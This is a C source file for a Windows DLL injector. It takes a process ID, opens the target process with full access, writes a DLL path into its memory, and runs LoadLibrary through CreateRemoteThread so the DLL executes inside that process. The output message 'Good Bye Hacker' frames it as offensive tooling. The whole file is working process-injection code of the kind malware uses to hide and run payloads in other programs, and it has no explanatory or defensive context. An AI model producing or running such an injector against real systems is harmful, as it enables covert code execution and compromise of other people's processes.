#include <stdio.h>
#include <windows.h>

char sMsg[] = "[+]";
char iMsg[] = "[*]";
char eMsg[] = "[-]";

HANDLE hProcess, hThread = NULL; 
DWORD PID, resultT = 0;
LPVOID pMemoryAddress = NULL; 
char dllName[] = "C:\\injector.dll";

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("%s Usage: .\\injector.exe <PID>\n", eMsg);
		return EXIT_FAILURE;
	}
	PID = atoi(argv[1]);
	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID)) != NULL) {
		if ((pMemoryAddress = VirtualAllocEx(hProcess, NULL, sizeof(dllName), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE)) != NULL) {
			printf("%s Allocated %zu-bytes on %p Address!\n", iMsg, sizeof(dllName), hProcess);
			if (WriteProcessMemory(hProcess, pMemoryAddress, dllName, sizeof(dllName), NULL)) {
				if ((hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, pMemoryAddress, 0, NULL)) != NULL) {
					resultT = WaitForSingleObject(hThread, INFINITE);
					if (resultT == WAIT_OBJECT_0) {
						printf("%s Good Bye Hacker :>\n", iMsg);
					}
				}
				else {
					printf("%s Failed to Execute Thread! Error Code: 0x0%lx\n", eMsg, GetLastError());
					return EXIT_FAILURE;
				}
			}
			else {
				printf("%s Failed to WriteProcessMemory! Error Code: 0x0%lx\n", eMsg, GetLastError());
				return EXIT_FAILURE;
			}
		}
		else {
			printf("%s Failed to allocate to Process! Error Code: 0x0%lx\n", eMsg, GetLastError());
			return EXIT_FAILURE;
		}
	}
	else {
		printf("%s Failed to Process Access! Error Code: 0x0%lx\n", eMsg, GetLastError());
		return EXIT_FAILURE;
	}
	return EXIT_SUCCESS;
}